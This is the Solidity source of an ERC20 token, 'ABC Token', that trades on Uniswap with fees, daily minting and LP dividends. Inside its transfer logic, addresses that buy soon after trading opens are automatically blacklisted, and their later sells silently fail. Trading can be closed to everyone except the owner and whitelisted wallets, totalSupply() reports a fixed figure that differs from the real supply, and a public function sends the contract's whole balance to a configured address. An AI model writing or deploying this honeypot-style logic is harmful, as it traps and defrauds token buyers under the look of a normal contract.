// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";
import "./IUniswapV2Router.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./Data.sol";
import "./DividendHandler.sol";

contract Token is ERC20, Ownable {
    using SafeMath for uint256;
    using SafeMath for uint112;

    Data data;
    DividendHandler dividendHandler;
    address public pair;

    uint256 initOutput;
    uint256 public initOutputTime;
    uint256 public lastOutputTime;

    event OutputEveryDay(address outputAddr, uint256 amount, uint256 timestamp);

    constructor(address dataAddr, address tokenAddr) ERC20("ABC Token", "ABC") {
        data = Data(dataAddr);

        initOutput = 54300 * 10**decimals();
        initOutputTime = getCurrentTime0(block.timestamp);

        outputEveryDay();

        _mint(
            data.string2addressMapping("perwallet"),
            5 * 10**7 * 10**decimals()
        );

        pair = IUniswapV2Factory(getRouter().factory()).createPair(
            address(this),
            tokenAddr
        );

        _approve(address(this), getRouterAddress(), totalSupply());
    }

    function test(uint256 init, uint256 last) public onlyOwner {
        initOutputTime = init;
        lastOutputTime = last;
    }

    function setDividendAddress(address dividendAddr) public onlyOwner {
        dividendHandler = DividendHandler(dividendAddr);
    }

    function totalSupply() public view virtual override returns (uint256) {
        return 2 * 10**8 * 10**decimals();
    }

    function realTotalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function outputEveryDay() public returns (uint256) {
        uint256 _time = block.timestamp;
        uint256 _currentTime = getCurrentTime0(_time);
        require(
            lastOutputTime == 0 || lastOutputTime != _currentTime,
            "output not now"
        );

        lastOutputTime = _currentTime;
        uint256 _outputAmount = initOutput.div(
            2**((lastOutputTime.sub(initOutputTime)).div(126144000))
        );

        _mint(data.string2addressMapping("outputwallet"), _outputAmount);

        emit OutputEveryDay(
            data.string2addressMapping("outputwallet"),
            _outputAmount,
            block.timestamp
        );

        return _outputAmount;
    }

    function getCurrentTime0(uint256 _time) public pure returns (uint256) {
        return _time - ((_time.add(8 * 3600)) % 86400);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        if (from == address(this) || to == address(this) || 0 == amount) {
            super._transfer(from, to, amount);
            return;
        }

        if (pairInclude(from) || pairInclude(to)) {
            bool open = data.string2boolMapping("open");
            if (open && from != owner() && to != owner()) {
                uint256 openTime = data.string2uintMapping("opentime");
                uint256 limit = data.string2uintMapping("limit");

                if (block.timestamp - openTime < limit) {
                    address user = pairInclude(from) ? to : from;
                    if (data.address2uintMapping(user) == 0)
                        data.setAddress2UintData(user, 1);
                }

                uint256 feeAmount;

                if (pairInclude(from)) {
                    if (data.address2uintMapping(to) == 2) {
                        super._transfer(from, to, amount);
                        return;
                    }

                    feeAmount = amount
                        .mul(data.string2uintMapping("buyFeeRate"))
                        .div(1000000)
                        .div(100);

                    super._transfer(from, to, amount);
                    super._transfer(to, address(this), feeAmount);
                } else {
                    if (data.address2uintMapping(from) == 1) {
                        return;
                    }

                    dividendHandler.putLpProvider(from);

                    if (data.address2uintMapping(from) == 2) {
                        super._transfer(from, to, amount);
                        return;
                    }

                    feeAmount = amount
                        .mul(data.string2uintMapping("sellFeeRate"))
                        .div(1000000)
                        .div(100);

                    uint256 realamount = amount.sub(feeAmount);
                    super._transfer(from, to, realamount);
                    super._transfer(from, address(this), feeAmount);
                }
            } else {
                if (pairInclude(to)) {
                    dividendHandler.putLpProvider(from);
                }

                if (
                    from == owner() ||
                    to == owner() ||
                    data.address2uintMapping(from) == 3 ||
                    data.address2uintMapping(to) == 3
                ) {
                    super._transfer(from, to, amount);
                }
            }
        } else {
            require(
                data.address2uintMapping(from) != 1,
                "the address is in black list"
            );
            super._transfer(from, to, amount);
        }
    }

    function handleDividend() public {
        uint256 swapOverlimit = data.string2uintMapping(
            "numToSwapAddLiquidity"
        );
        require(
            balanceOf(address(this)) >= swapOverlimit,
            "balance not enough"
        );

        swapAddLiquidity();

        uint256 lpOverlimit = data.string2uintMapping("numToHandleDividend");
        uint256 balanceLp = IERC20(pair).balanceOf(address(this));
        require(balanceLp >= lpOverlimit, "balanceLp not enough");
        uint256 destroyAmount = balanceLp
            .mul(data.string2uintMapping("lpDestroyRate"))
            .div(1000000)
            .div(100);
        IERC20(pair).transfer(
            data.string2addressMapping("lpDestroyAddress"),
            destroyAmount
        );

        (
            address[] memory lpHolders,
            uint256[] memory dividenAmount
        ) = dividendHandler.handleDividend(balanceLp.sub(destroyAmount));
        for (uint256 index = 0; index < lpHolders.length; index++) {
            if (dividenAmount[index] > 0)
                IERC20(pair).transfer(lpHolders[index], dividenAmount[index]);
        }
    }

    function swapAddLiquidity() private {
        uint256 overlimit = balanceOf(address(this));

        uint256 half = overlimit.div(2);
        uint256 otherHalf = overlimit.sub(half);

        address[] memory path = new address[](2);
        path[0] = address(this);
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        path[1] = token0 == address(this) ? token1 : token0;

        if (path[1] == getRouter().WETH()) {
            uint256 initialBalance = address(this).balance;

            getRouter().swapExactTokensForETHSupportingFeeOnTransferTokens(
                half,
                0,
                path,
                address(this),
                block.timestamp
            );

            uint256 wethAmount = address(this).balance.sub(initialBalance);

            getRouter().addLiquidityETH{value: wethAmount}(
                address(this),
                otherHalf,
                0,
                0,
                address(this),
                block.timestamp
            );
        } else {
            uint256 initialBalance = IERC20(path[1]).balanceOf(address(this));

            getRouter().swapExactTokensForTokensSupportingFeeOnTransferTokens(
                half,
                0,
                path,
                address(dividendHandler),
                block.timestamp
            );
            dividendHandler.takeToken(path[1], address(this));

            uint256 token1Amount = IERC20(path[1]).balanceOf(address(this)).sub(
                initialBalance
            );

            IERC20(path[1]).approve(getRouterAddress(), token1Amount);

            getRouter().addLiquidity(
                path[0],
                path[1],
                otherHalf,
                token1Amount,
                0,
                0,
                address(this),
                block.timestamp
            );
        }
    }

    function switchState(bool open) public onlyOwner {
        data.setString2BoolData("open", open);
        if (open) {
            data.setString2UintData("opentime", block.timestamp);
        }
    }

    function getRouterAddress() public virtual returns (address) {
        return data.string2addressMapping("router");
    }

    function getTakeAddress() public virtual returns (address) {
        return data.string2addressMapping("take");
    }

    function getRouter() public returns (IUniswapV2Router02) {
        return IUniswapV2Router02(getRouterAddress());
    }

    function pairInclude(address _addr) public view returns (bool) {
        return pair == _addr;
    }

    function takeToken(address token) public {
        if (token == getRouter().WETH()) {
            payable(getTakeAddress()).transfer(address(this).balance);
        } else {
            uint256 balance = IERC20(token).balanceOf(address(this));
            IERC20(token).transfer(getTakeAddress(), balance);
        }
    }

    function getTime() public view returns (uint256) {
        return block.timestamp;
    }

    receive() external payable {}
}